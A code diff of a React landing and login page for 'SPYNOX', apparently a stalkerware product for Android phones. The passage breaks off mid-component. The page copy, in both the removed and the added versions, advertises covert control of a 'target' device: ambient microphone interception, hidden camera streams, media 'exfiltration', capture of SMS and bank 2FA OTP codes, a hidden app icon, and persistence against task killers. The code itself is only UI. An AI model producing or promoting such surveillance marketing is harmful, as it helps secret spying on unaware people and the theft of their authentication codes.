@@ -8,7 +8,8 @@ import {
     Bell, EyeOff, Shield, Zap, ArrowRight, Play, X,
     Smartphone, CheckCircle2, Lock, Sparkles, Download,
     Radio, Activity, Layers, Terminal, ChevronRight, Eye,
-    Flashlight, Vibrate, RefreshCw, Volume2, ShieldAlert
+    Flashlight, Vibrate, RefreshCw, Volume2, ShieldAlert,
+    Cpu, HardDrive, Wifi, Globe, Key, Crosshair
 } from 'lucide-react';
 import VideoModal from '@/components/VideoModal';
 
@@ -19,16 +20,14 @@ export default function LoginPage() {
     const [isVideoModalOpen, setIsVideoModalOpen] = useState(false);
     const [isLoggingIn, setIsLoggingIn] = useState(false);
     
-    // Live Interactive Hardware Controls State
-    const [activeTool, setActiveTool] = useState<'camera' | 'mic' | 'vault' | 'sms'>('camera');
-    const [cameraFacing, setCameraFacing] = useState<'front' | 'rear'>('rear');
-    const [isTorchOn, setIsTorchOn] = useState(false);
-    const [isVibrating, setIsVibrating] = useState(false);
-    const [isMicStreaming, setIsMicStreaming] = useState(true);
-    const [isStealthCloaked, setIsStealthCloaked] = useState(true);
-    const [snapshotCount, setSnapshotCount] = useState(18);
+    // Interactive Bento Cards State
+    const [cameraFacing, setCameraFacing] = useState<'rear' | 'front'>('rear');
+    const [isNightMode, setIsNightMode] = useState(false);
+    const [snapshotCount, setSnapshotCount] = useState(24);
     const [isCapturing, setIsCapturing] = useState(false);
-    const [actionLog, setActionLog] = useState('Relay initialized. Tunnel secured via AES-256.');
+    const [isAudioLive, setIsAudioLive] = useState(true);
+    const [isGhostActive, setIsGhostActive] = useState(true);
+    const [isZipExtracting, setIsZipExtracting] = useState(false);
 
     // Auto-redirect if already signed in
     useEffect(() => {
@@ -47,40 +46,45 @@ export default function LoginPage() {
         }
     };
 
-    const triggerSnapshot = () => {
+    const handleSnapshot = () => {
         setIsCapturing(true);
-        setActionLog(`Captured 48MP RAW snapshot from ${cameraFacing.toUpperCase()} camera.`);
         setTimeout(() => {
             setIsCapturing(false);
             setSnapshotCount(prev => prev + 1);
-        }, 350);
+        }, 300);
     };
 
-    const triggerVibrationPulse = () => {
-        setIsVibrating(true);
-        setActionLog('Dispatched 3x 500ms haptic vibration pulse sequence.');
-        setTimeout(() => setIsVibrating(false), 1200);
+    const handleZipExtraction = () => {
+        setIsZipExtracting(true);
+        setTimeout(() => {
+            setIsZipExtracting(false);
+        }, 1500);
     };
 
-    const toggleTorch = () => {
-        const next = !isTorchOn;
-        setIsTorchOn(next);
-        setActionLog(`Hardware Torch toggled: ${next ? 'HIGH BEAM ACTIVE ⚡' : 'OFF'}.`);
-    };
+    const marqueeItems = [
+        { label: 'SPYNOX OS v3.4', icon: Zap, color: 'text-orange-400' },
+        { label: 'AES-256 E2E ENCRYPTED', icon: Lock, color: 'text-amber-400' },
+        { label: '10,000+ CONNECTED ENDPOINTS', icon: Smartphone, color: 'text-emerald-400' },
+        { label: '4K DUAL OPTICAL STREAM', icon: Camera, color: 'text-cyan-400' },
+        { label: '48kHz VOIP AMBIENT RECORDING', icon: Mic, color: 'text-purple-400' },
+        { label: '100% ZERO-ICON GHOST STEALTH', icon: EyeOff, color: 'text-rose-400' },
+        { label: 'ZERO-ROOT REQUIRED (ANDROID 7-15)', icon: ShieldAlert, color: 'text-yellow-400' },
+    ];
 
     return (
-        <div className="min-h-screen bg-[#0a0c10] text-white flex flex-col selection:bg-orange-500/30 selection:text-orange-300 antialiased overflow-x-hidden">
+        <div className="min-h-screen bg-[#090b0e] text-white flex flex-col selection:bg-orange-500/30 selection:text-orange-300 antialiased overflow-x-hidden">
             
             {/* Ambient Background Lighting Mesh */}
-            <div className="fixed top-[-100px] left-1/2 -translate-x-1/2 w-[800px] h-[450px] bg-gradient-to-b from-orange-500/15 via-amber-500/5 to-transparent rounded-full blur-[150px] pointer-events-none" />
-            <div className="fixed bottom-0 right-[-100px] w-[500px] h-[500px] bg-cyan-500/5 rounded-full blur-[150px] pointer-events-none" />
+            <div className="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[500px] bg-gradient-to-b from-orange-500/12 via-amber-500/5 to-transparent rounded-full blur-[160px] pointer-events-none" />
+            <div className="fixed top-1/2 right-[-150px] w-[500px] h-[500px] bg-cyan-500/5 rounded-full blur-[160px] pointer-events-none" />
+            <div className="fixed bottom-0 left-[-150px] w-[500px] h-[500px] bg-purple-500/5 rounded-full blur-[160px] pointer-events-none" />
 
-            {/* 1. Ultra-Clean Sticky Header */}
-            <header className="sticky top-0 z-50 px-4 sm:px-8 py-3.5 bg-[#0a0c10]/90 backdrop-blur-2xl border-b border-white/5">
+            {/* 1. Header Bar */}
+            <header className="sticky top-0 z-50 px-4 sm:px-8 py-3 bg-[#090b0e]/90 backdrop-blur-2xl border-b border-white/5">
                 <div className="max-w-6xl mx-auto flex items-center justify-between">
                     
                     {/* Brand Pod */}
-                    <div className="flex items-center gap-2.5">
+                    <div className="flex items-center gap-3">
                         <div className="w-10 h-10 rounded-2xl bg-gradient-to-br from-orange-500 to-amber-600 flex items-center justify-center text-white shadow-[0_0_20px_rgba(249,115,22,0.4)] border border-orange-400/40">
                             <Shield size={20} className="stroke-[2.5]" />
                         </div>
@@ -89,10 +93,13 @@ export default function LoginPage() {
                                 <span>SPYNOX</span>
                                 <span className="text-[9px] font-extrabold text-orange-400 px-2 py-0.5 rounded-full bg-orange-500/10 border border-orange-500/30">v3.4</span>
                             </span>
+                            <span className="text-[9px] font-mono text-white/40 uppercase tracking-widest hidden sm:block">
+                                Remote Command Suite
+                            </span>
                         </div>
                     </div>
 
-                    {/* Sign In CTA */}
+                    {/* Header Action Button */}
                     <button
                         type="button"
                         onClick={handleGoogleSignIn}
@@ -105,30 +112,69 @@ export default function LoginPage() {
                 </div>
             </header>
 
-            {/* 2. Hero Section: Luxury Cyber Aesthetic */}
+            {/* 2. Live Telemetry Marquee Ticker Bar */}
+            <div className="w-full bg-[#0d1015] border-b border-white/5 py-2 overflow-hidden flex items-center shadow-inner">
+                <div className="flex whitespace-nowrap animate-marquee">
+                    {[...marqueeItems, ...marqueeItems].map((item, idx) => {
+                        const Icon = item.icon;
+                        return (
+                            <div key={idx} className="flex items-center gap-2 mx-5 text-[11px] font-mono font-bold text-white/70">
+                                <Icon size={13} className={item.color} />
+                                <span>{item.label}</span>
+                                <span className="text-white/20 ml-3">•</span>
+                            </div>
+                        );
+                    })}
+                </div>
+            </div>
+
+            {/* 3. Hero Section: 3D Holographic Core & Headline */}
             <main className="flex-1">
-                <section className="pt-10 sm:pt-16 pb-8 px-4 sm:px-6 max-w-5xl mx-auto text-center space-y-6">
+                <section className="pt-10 sm:pt-16 pb-12 sm:pb-20 px-4 sm:px-6 max-w-5xl mx-auto text-center space-y-7">
                     
-                    {/* Live Badge */}
+                    {/* Top Beacon Badge */}
                     <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-orange-500/10 border border-orange-500/30 text-orange-400 text-xs font-mono font-bold shadow-[0_0_25px_rgba(249,115,22,0.2)]">
                         <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 shadow-[0_0_10px_#10b981] animate-pulse" />
-                        <span>LIVE DEVICE INTELLIGENCE PLATFORM</span>
+                        <span>TACTICAL HARDWARE INTELLIGENCE</span>
                     </div>
 
-                    {/* Bold Hero Headline */}
+                    {/* 3D Gyroscopic Holographic Cyber Core (Pure GPU CSS 3D - Zero Lag) */}
+                    <div className="relative w-40 h-40 sm:w-48 sm:h-48 mx-auto my-2 flex items-center justify-center [perspective:1000px]">
+                        
+                        {/* Outer Gyro Ring X (Orange) */}
+                        <div className="absolute inset-0 rounded-full border-2 border-dashed border-orange-500/50 animate-gyro-x pointer-events-none shadow-[0_0_30px_rgba(249,115,22,0.3)]" />
+                        
+                        {/* Middle Gyro Ring Y (Cyan) */}
+                        <div className="absolute inset-2 rounded-full border-2 border-cyan-400/40 animate-gyro-y pointer-events-none shadow-[0_0_30px_rgba(6,182,212,0.25)]" />
+                        
+                        {/* Inner Gyro Ring Z (Purple) */}
+                        <div className="absolute inset-4 rounded-full border border-purple-500/40 animate-gyro-z pointer-events-none shadow-[0_0_25px_rgba(168,85,247,0.25)]" />
+                        
+                        {/* Radar Sweep Reticle */}
+                        <div className="absolute inset-6 rounded-full border border-white/10 overflow-hidden flex items-center justify-center">
+                            <div className="absolute inset-0 bg-gradient-to-tr from-orange-500/20 via-transparent to-transparent animate-radar-sweep origin-center" />
+                        </div>
+
+                        {/* Center Hologram Shield Avatar */}
+                        <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-3xl bg-gradient-to-br from-[#181b22] to-[#0c0e12] border border-orange-400/50 flex items-center justify-center text-orange-400 shadow-[0_0_40px_rgba(249,115,22,0.5)] z-10">
+                            <Shield size={32} className="stroke-[2.5] animate-pulse" />
+                        </div>
+                    </div>
+
+                    {/* Main Headline */}
                     <h1 className="text-3xl sm:text-5xl md:text-6xl font-black tracking-tight leading-[1.12] text-white">
-                        Remote Device Intelligence. <br />
+                        Unified Remote Intelligence. <br />
                         <span className="bg-gradient-to-r from-orange-400 via-amber-300 to-yellow-400 bg-clip-text text-transparent">
-                            Engineered for Pure Control.
+                            Engineered for Absolute Control.
                         </span>
                     </h1>
 
                     {/* Subtitle */}
-                    <p className="text-sm sm:text-lg text-zinc-400 max-w-xl mx-auto font-normal leading-relaxed">
-                        Real-time dual optical feeds, ambient listening, media vault exfiltration, and hardware diagnostics in one unified web console.
+                    <p className="text-sm sm:text-base text-zinc-400 max-w-xl mx-auto font-normal leading-relaxed">
+                        Real-time optical streams, ambient audio interceptor, encrypted media vaults, and low-level hardware diagnostics across any Android endpoint.
                     </p>
 
-                    {/* Action Buttons */}
+                    {/* Primary Action Buttons */}
                     <div className="flex flex-col sm:flex-row items-center justify-center gap-3.5 pt-2 max-w-md mx-auto">
                         <button
                             type="button"
@@ -148,388 +194,238 @@ export default function LoginPage() {
                         <button
                             type="button"
                             onClick={() => setIsVideoModalOpen(true)}
-                            className="w-full sm:w-auto py-4 px-6 rounded-2xl bg-[#141722] hover:bg-[#1a1e2d] border border-white/10 text-white font-bold text-xs font-mono flex items-center justify-center gap-2 cursor-pointer active:scale-95 transition-all"
+                            className="w-full sm:w-auto py-4 px-6 rounded-2xl bg-[#13161f] hover:bg-[#1a1e2a] border border-white/10 text-white font-bold text-xs font-mono flex items-center justify-center gap-2 cursor-pointer active:scale-95 transition-all"
                         >
                             <Play size={14} className="text-orange-400 fill-orange-400" />
-                            <span>1-Min Video Guide</span>
+                            <span>1-Min Walkthrough</span>
                         </button>
                     </div>
                 </section>
 
-                {/* 3. The Spynox Interactive Live Hardware Deck (The Masterpiece Centerpiece) */}
-                <section className="px-4 sm:px-6 max-w-5xl mx-auto pb-16">
-                    <div className="clay-card rounded-3xl sm:rounded-[2.5rem] p-4 sm:p-7 border border-white/15 shadow-[0_30px_90px_rgba(0,0,0,0.95)] space-y-5">
+                {/* 4. Interactive Cyber Bento Showcase (4 Luxury High-Impact Cards) */}
+                <section className="py-8 sm:py-16 px-4 sm:px-6 max-w-6xl mx-auto space-y-8">
+                    
+                    <div className="text-center space-y-2">
+                        <div className="inline-block px-3.5 py-1 rounded-full bg-orange-500/10 border border-orange-500/30 text-[10px] font-mono font-black uppercase tracking-wider text-orange-400">
+                            SURVEILLANCE ARCHITECTURE
+                        </div>
+                        <h2 className="text-2xl sm:text-4xl font-black text-white tracking-tight">
+                            Command & Control Capabilities
+                        </h2>
+                    </div>
+
+                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                         
-                        {/* Terminal Header Bar */}
-                        <div className="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-white/10">
-                            <div className="flex items-center gap-3">
-                                <div className="w-11 h-11 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
-                                    <Smartphone size={22} />
-                                </div>
-                                <div>
-                                    <div className="text-sm sm:text-base font-black text-white flex items-center gap-2 font-mono">
-                                        <span>Galaxy S24 Ultra</span>
-                                        <span className="text-[10px] text-emerald-400 font-bold px-2.5 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30">
-                                            ● LIVE CONNECTED
-                                        </span>
-                                    </div>
-                                    <div className="text-xs text-zinc-400 font-mono mt-0.5">
-                                        AES-256 E2E Tunnel • Battery: 94% ⚡ • Android 14
-                                    </div>
-                                </div>
-                            </div>
-
-                            {/* Ping Pill */}
-                            <div className="flex items-center gap-2">
-                                <div className="px-3.5 py-1.5 rounded-xl bg-orange-500/10 border border-orange-500/30 text-xs font-mono font-bold text-orange-400">
-                                    14ms LATENCY
-                                </div>
-                            </div>
-                        </div>
-
-                        {/* 4 Interactive Tool Mode Tabs */}
-                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
-                            {[
-                                { id: 'camera', label: 'Camera Stream', icon: Camera, color: 'text-cyan-400' },
-                                { id: 'mic', label: 'Mic Audio', icon: Mic, color: 'text-purple-400' },
-                                { id: 'vault', label: 'Media Vault', icon: ImageIcon, color: 'text-emerald-400' },
-                                { id: 'sms', label: 'SMS Logs', icon: MessageSquare, color: 'text-rose-400' },
-                            ].map((tab) => {
-                                const Icon = tab.icon;
-                                const isActive = activeTool === tab.id;
-                                return (
-                                    <button
-                                        key={tab.id}
-                                        type="button"
-                                        onClick={() => {
-                                            setActiveTool(tab.id as any);
-                                            setActionLog(`Switched viewport to ${tab.label}.`);
-                                        }}
-                                        className={`p-3 rounded-2xl text-xs font-mono font-bold flex items-center justify-center gap-2 cursor-pointer transition-all ${
-                                            isActive
-                                                ? 'clay-cta-button text-white font-black shadow-[0_0_20px_rgba(249,115,22,0.4)]'
-                                                : 'bg-[#12141a] hover:bg-[#181a24] text-zinc-400 hover:text-white border border-white/5'
-                                        }`}
-                                    >
-                                        <Icon size={15} className={isActive ? 'text-white' : tab.color} />
-                                        <span>{tab.label}</span>
-                                    </button>
-                                );
-                            })}
-                        </div>
-
-                        {/* Interactive Inset Viewport Deck */}
-                        <div className="bg-[#0e1017] rounded-3xl p-4 sm:p-6 border border-white/10 min-h-[230px] flex flex-col justify-between relative overflow-hidden">
+                        {/* Bento Card 1 (Large 2-Column Hero): Optical Vision Viewfinder */}
+                        <div className="lg:col-span-2 clay-card p-5 sm:p-7 rounded-[2.5rem] border border-white/10 space-y-5 relative overflow-hidden flex flex-col justify-between">
                             
-                            {/* Shutter White Flash Animation */}
                             {isCapturing && (
                                 <div className="absolute inset-0 bg-white/40 z-30 pointer-events-none transition-opacity duration-300" />
                             )}
 
-                            {activeTool === 'camera' && (
-                                <div className="space-y-4">
-                                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                                        <div>
-                                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-cyan-300 text-xs font-mono font-bold mb-1">
-                                                <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse" />
-                                                <span>OPTICAL FEED: 1080P RAW ACTIVE</span>
-                                            </div>
-                                            <h4 className="text-base sm:text-lg font-black text-white">Dual Lens Real-Time Viewfinder</h4>
+                            <div>
+                                <div className="flex flex-wrap items-center justify-between gap-3 pb-3 border-b border-white/5">
+                                    <div className="flex items-center gap-3">
+                                        <div className="w-10 h-10 rounded-2xl bg-cyan-500/15 border border-cyan-500/30 flex items-center justify-center text-cyan-400 shrink-0">
+                                            <Camera size={20} />
                                         </div>
-
-                                        {/* Lens Switcher */}
-                                        <div className="flex items-center gap-2">
-                                            <button
-                                                type="button"
-                                                onClick={() => {
-                                                    const next = cameraFacing === 'rear' ? 'front' : 'rear';
-                                                    setCameraFacing(next);
-                                                    setActionLog(`Switched optical sensor to: ${next.toUpperCase()} CAMERA.`);
-                                                }}
-                                                className="px-3.5 py-1.5 rounded-xl bg-white/5 border border-white/10 text-xs font-mono font-bold text-cyan-300 flex items-center gap-1.5 cursor-pointer hover:bg-white/10"
-                                            >
-                                                <RefreshCw size={12} />
-                                                <span>Lens: {cameraFacing.toUpperCase()}</span>
-                                            </button>
+                                        <div>
+                                            <h3 className="text-base sm:text-lg font-black text-white">Live Optical Viewfinder</h3>
+                                            <p className="text-xs text-zinc-400 font-mono">1080p RAW Stream • Zero Latency</p>
                                         </div>
                                     </div>
 
-                                    {/* Live Interactive Action Bar */}
-                                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-2">
+                                    {/* Lens Controls */}
+                                    <div className="flex items-center gap-2">
                                         <button
                                             type="button"
-                                            onClick={triggerSnapshot}
-                                            className="clay-cta-button p-3 rounded-2xl text-xs font-mono font-black uppercase tracking-wider flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_20px_rgba(249,115,22,0.3)] active:scale-95 transition-transform"
+                                            onClick={() => setCameraFacing(prev => prev === 'rear' ? 'front' : 'rear')}
+                                            className="px-3.5 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-mono font-bold text-cyan-300 flex items-center gap-1.5 cursor-pointer"
                                         >
-                                            <Camera size={16} />
-                                            <span>Capture Snapshot ({snapshotCount})</span>
+                                            <RefreshCw size={12} />
+                                            <span>Lens: {cameraFacing.toUpperCase()}</span>
                                         </button>
-
                                         <button
                                             type="button"
-                                            onClick={toggleTorch}
-                                            className={`p-3 rounded-2xl text-xs font-mono font-bold flex items-center justify-center gap-2 cursor-pointer transition-all border ${
-                                                isTorchOn 
-                                                    ? 'bg-amber-500/20 text-amber-300 border-amber-500/50 shadow-[0_0_20px_rgba(245,158,11,0.3)]' 
-                                                    : 'bg-[#151720] text-zinc-400 border-white/5 hover:border-white/20'
+                                            onClick={() => setIsNightMode(prev => !prev)}
+                                            className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold flex items-center gap-1 cursor-pointer border ${
+                                                isNightMode ? 'bg-amber-500/20 text-amber-300 border-amber-500/50' : 'bg-white/5 text-zinc-400 border-white/10'
                                             }`}
                                         >
-                                            <Flashlight size={16} className={isTorchOn ? 'text-amber-400' : ''} />
-                                            <span>Torch: {isTorchOn ? 'HIGH BEAM ON ⚡' : 'OFF'}</span>
-                                        </button>
-
-                                        <button
-                                            type="button"
-                                            onClick={triggerVibrationPulse}
-                                            className={`p-3 rounded-2xl text-xs font-mono font-bold flex items-center justify-center gap-2 cursor-pointer transition-all border ${
-                                                isVibrating 
-                                                    ? 'bg-orange-500/20 text-orange-300 border-orange-500/50 shadow-[0_0_20px_rgba(249,115,22,0.4)] animate-bounce' 
-                                                    : 'bg-[#151720] text-zinc-400 border-white/5 hover:border-white/20'
-                                            }`}
-                                        >
-                                            <Vibrate size={16} />
-                                            <span>{isVibrating ? 'Pulsing Device...' : 'Send Haptic Pulse'}</span>
+                                            <span>IR Night</span>
                                         </button>
                                     </div>
                                 </div>
-                            )}
 
-                            {activeTool === 'mic' && (
-                                <div className="space-y-4">
-                                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                                        <div>
-                                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-purple-500/15 border border-purple-500/30 text-purple-300 text-xs font-mono font-bold mb-1">
-                                                <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />
-                                                <span>48KHZ STEREO LISTENING ACTIVE</span>
-                                            </div>
-                                            <h4 className="text-base sm:text-lg font-black text-white">Ambient Microphone Interceptor</h4>
+                                {/* Simulated Viewfinder HUD */}
+                                <div className="mt-4 rounded-2xl bg-[#090b0f] border border-white/10 p-5 min-h-[160px] flex flex-col justify-between relative">
+                                    <div className="flex items-center justify-between text-[10px] font-mono text-cyan-400">
+                                        <span>SENSOR: SONY IMX989</span>
+                                        <span className="text-emerald-400 font-bold">● 60 FPS RELAY</span>
+                                    </div>
+
+                                    {/* Targeting Crosshair */}
+                                    <div className="flex items-center justify-center my-3">
+                                        <div className="w-24 h-24 border border-cyan-500/30 rounded-2xl flex items-center justify-center relative">
+                                            <Crosshair size={24} className="text-cyan-400/60" />
                                         </div>
-
-                                        <span className="text-xs font-mono text-purple-300 font-bold px-3 py-1 rounded-xl bg-purple-500/10 border border-purple-500/30">
-                                            VoIP Bypassed
-                                        </span>
                                     </div>
 
-                                    {/* Real Dancing Soundwave Spectrum */}
-                                    <div className="flex items-center gap-1.5 h-10 px-3 rounded-2xl bg-black/40 border border-white/5 overflow-hidden">
-                                        {[45, 80, 60, 95, 30, 70, 100, 85, 40, 65, 90, 75, 50, 85, 95, 60, 40, 70, 90, 80, 55, 65, 100, 70].map((h, i) => (
-                                            <div
-                                                key={i}
-                                                className="flex-1 bg-gradient-to-t from-purple-600 via-indigo-500 to-cyan-400 rounded-full transition-all duration-200"
-                                                style={{ height: isMicStreaming ? `${h}%` : '15%' }}
-                                            />
-                                        ))}
-                                    </div>
-
-                                    <div className="flex flex-col sm:flex-row items-center gap-3 pt-1">
-                                        <button
-                                            type="button"
-                                            onClick={() => {
-                                                const next = !isMicStreaming;
-                                                setIsMicStreaming(next);
-                                                setActionLog(next ? 'Live Audio Stream resumed.' : 'Live Audio Stream paused.');
-                                            }}
-                                            className="w-full sm:w-auto px-5 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-mono font-bold flex items-center justify-center gap-2 cursor-pointer text-purple-300"
-                                        >
-                                            <Volume2 size={15} />
-                                            <span>{isMicStreaming ? 'Pause Audio Stream' : 'Resume Audio Stream'}</span>
-                                        </button>
-
-                                        <button
-                                            type="button"
-                                            onClick={handleGoogleSignIn}
-                                            className="clay-cta-button w-full sm:w-auto px-6 py-2.5 rounded-xl text-xs font-mono font-black uppercase tracking-wider cursor-pointer"
-                                        >
-                                            Open Audio Vault
-                                        </button>
+                                    <div className="flex items-center justify-between text-[10px] font-mono text-white/40">
+                                        <span>ISO 100 • 24mm f/1.7</span>
+                                        <span>AUTO EXPOSURE</span>
                                     </div>
                                 </div>
-                            )}
-
-                            {activeTool === 'vault' && (
-                                <div className="space-y-4">
-                                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                                        <div>
-                                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-mono font-bold mb-1">
-                                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
-                                                <span>4,218 MEDIA FILES SYNCED & SECURED</span>
-                                            </div>
-                                            <h4 className="text-base sm:text-lg font-black text-white">Full Gallery Vault & Export</h4>
-                                        </div>
-
-                                        <span className="text-xs font-mono text-emerald-400 font-bold px-3 py-1 rounded-xl bg-emerald-500/10 border border-emerald-500/30">
-                                            100% EXIF Data
-                                        </span>
-                                    </div>
-
-                                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
-                                        {[
-                                            { title: 'DCIM Photos', count: '2,842 files', size: '14.2 GB' },
-                                            { title: '4K Videos', count: '184 files', size: '38.6 GB' },
-                                            { title: 'WhatsApp Media', count: '1,120 files', size: '6.4 GB' },
-                                            { title: 'Hidden Screenshots', count: '72 files', size: '420 MB' },
-                                        ].map((cat, idx) => (
-                                            <div key={idx} className="bg-[#141722] p-3 rounded-2xl border border-white/5 space-y-1">
-                                                <div className="text-xs font-black text-white truncate">{cat.title}</div>
-                                                <div className="text-[10px] font-mono text-emerald-400 font-bold">{cat.count}</div>
-                                                <div className="text-[9px] font-mono text-white/40">{cat.size}</div>
-                                            </div>
-                                        ))}
-                                    </div>
-
-                                    <button
-                                        type="button"
-                                        onClick={handleGoogleSignIn}
-                                        className="clay-cta-button w-full py-3 rounded-xl text-xs font-mono font-black uppercase tracking-wider flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_20px_rgba(249,115,22,0.3)]"
-                                    >
-                                        <Download size={14} />
-                                        <span>Download Bulk ZIP Archive</span>
-                                    </button>
-                                </div>
-                            )}
-
-                            {activeTool === 'sms' && (
-                                <div className="space-y-4">
-                                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                                        <div>
-                                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-rose-500/15 border border-rose-500/30 text-rose-300 text-xs font-mono font-bold mb-1">
-                                                <span className="w-2 h-2 rounded-full bg-rose-400 animate-pulse" />
-                                                <span>SMS & OTP CAPTURE STREAM ACTIVE</span>
-                                            </div>
-                                            <h4 className="text-base sm:text-lg font-black text-white">Real-Time SMS & Chat Logs</h4>
-                                        </div>
-
-                                        <span className="text-xs font-mono text-rose-400 font-bold px-3 py-1 rounded-xl bg-rose-500/10 border border-rose-500/30">
-                                            Live Relay
-                                        </span>
-                                    </div>
-
-                                    <div className="space-y-2">
-                                        {[
-                                            { from: 'Bank Verification', text: 'Your 2FA OTP code is 849201. Valid for 5 minutes.', time: 'Just now' },
-                                            { from: '+1 (555) 382-9910', text: 'Package delivery has been confirmed at address.', time: '2m ago' },
-                                        ].map((msg, idx) => (
-                                            <div key={idx} className="bg-[#141722] p-3 rounded-2xl border border-white/5 flex items-center justify-between gap-3">
-                                                <div className="min-w-0">
-                                                    <div className="text-xs font-black text-white">{msg.from}</div>
-                                                    <div className="text-[11px] text-zinc-300 truncate">{msg.text}</div>
-                                                </div>
-                                                <div className="text-[10px] font-mono text-rose-400 font-bold shrink-0">{msg.time}</div>
-                                            </div>
-                                        ))}
-                                    </div>
-
-                                    <button
-                                        type="button"
-                                        onClick={handleGoogleSignIn}
-                                        className="clay-cta-button w-full py-3 rounded-xl text-xs font-mono font-black uppercase tracking-wider cursor-pointer shadow-[0_0_20px_rgba(249,115,22,0.3)]"
-                                    >
-                                        View Full SMS History
-                                    </button>
-                                </div>
-                            )}
-
-                            {/* Live Terminal Log HUD */}
-                            <div className="mt-4 pt-3 border-t border-white/5 flex items-center justify-between text-[11px] font-mono text-white/50">
-                                <div className="flex items-center gap-2 truncate">
-                                    <Terminal size={13} className="text-orange-400 shrink-0" />
-                                    <span className="text-zinc-300 truncate">{actionLog}</span>
-                                </div>
-                                <span className="text-emerald-400 font-bold hidden sm:inline shrink-0">RELAY OK</span>
                             </div>
-                        </div>
-                    </div>
-                </section>
 
-                {/* 4. Interactive Live Security & Stealth Switchboard */}
-                <section className="py-8 sm:py-12 px-4 sm:px-6 max-w-5xl mx-auto space-y-6">
-                    <div className="text-center space-y-2">
-                        <div className="inline-block px-3.5 py-1 rounded-full bg-orange-500/10 border border-orange-500/30 text-[10px] font-mono font-black uppercase tracking-wider text-orange-400">
-                            HARDWARE DEFENSE
-                        </div>
-                        <h2 className="text-2xl sm:text-3xl font-black text-white tracking-tight">
-                            Stealth & Security Switchboard
-                        </h2>
-                    </div>
-
-                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                        
-                        {/* Stealth Switch 1 */}
-                        <div className="clay-card p-5 sm:p-6 rounded-3xl border border-white/10 flex items-center justify-between gap-4">
-                            <div className="space-y-1">
-                                <div className="flex items-center gap-2">
-                                    <EyeOff size={18} className="text-emerald-400" />
-                                    <h3 className="text-sm sm:text-base font-black text-white">100% Zero-Icon Cloaking</h3>
-                                </div>
-                                <p className="text-xs text-zinc-400">Hides the app launcher icon from the target home screen.</p>
-                            </div>
-                            
-                            {/* Live Toggle Switch */}
+                            {/* Snapshot Action */}
                             <button
                                 type="button"
-                                onClick={() => {
-                                    const next = !isStealthCloaked;
-                                    setIsStealthCloaked(next);
-                                    setActionLog(next ? 'Icon cloaking enabled: App is invisible.' : 'Icon cloaking disabled.');
-                                }}
-                                className="w-14 h-8 rounded-full bg-black/60 border border-white/10 p-1 flex items-center cursor-pointer transition-colors shrink-0"
+                                onClick={handleSnapshot}
+                                className="clay-cta-button w-full py-3.5 rounded-2xl font-mono font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_20px_rgba(249,115,22,0.4)] active:scale-95 transition-transform"
                             >
-                                <div 
-                                    className={`w-6 h-6 rounded-full transition-transform ${
-                                        isStealthCloaked ? 'translate-x-6 uiverse-toggle-knob-active' : 'translate-x-0 uiverse-toggle-knob'
-                                    }`}
-                                />
+                                <Camera size={15} />
+                                <span>Capture Live RAW Snapshot ({snapshotCount})</span>
                             </button>
                         </div>
 
-                        {/* Stealth Switch 2 */}
-                        <div className="clay-card p-5 sm:p-6 rounded-3xl border border-white/10 flex items-center justify-between gap-4">
-                            <div className="space-y-1">
-                                <div className="flex items-center gap-2">
-                                    <Activity size={18} className="text-cyan-400" />
-                                    <h3 className="text-sm sm:text-base font-black text-white">Watchdog Auto-Restart</h3>
+                        {/* Bento Card 2: Ambient Audio Interceptor */}
+                        <div className="clay-card p-5 sm:p-7 rounded-[2.5rem] border border-white/10 space-y-5 flex flex-col justify-between">
+                            <div>
+                                <div className="flex items-center gap-3 pb-3 border-b border-white/5">
+                                    <div className="w-10 h-10 rounded-2xl bg-purple-500/15 border border-purple-500/30 flex items-center justify-center text-purple-400 shrink-0">
+                                        <Mic size={20} />
+                                    </div>
+                                    <div>
+                                        <h3 className="text-base font-black text-white">Audio Interceptor</h3>
+                                        <p className="text-xs text-zinc-400 font-mono">48kHz Stereo Listening</p>
+                                    </div>
                                 </div>
-                                <p className="text-xs text-zinc-400">Prevents OS battery task killers from ending background sync.</p>
+
+                                {/* Dancing Soundwave Spectrum */}
+                                <div className="mt-5 space-y-2">
+                                    <div className="text-[10px] font-mono text-purple-300 flex items-center justify-between">
+                                        <span>VoIP Bypass Active</span>
+                                        <span className="text-emerald-400">SYNCED</span>
+                                    </div>
+                                    <div className="flex items-center gap-1.5 h-14 px-3 rounded-2xl bg-black/40 border border-white/5 overflow-hidden">
+                                        {[40, 75, 55, 90, 30, 85, 100, 60, 45, 80, 95, 70, 50, 85, 90, 65, 40].map((h, i) => (
+                                            <div
+                                                key={i}
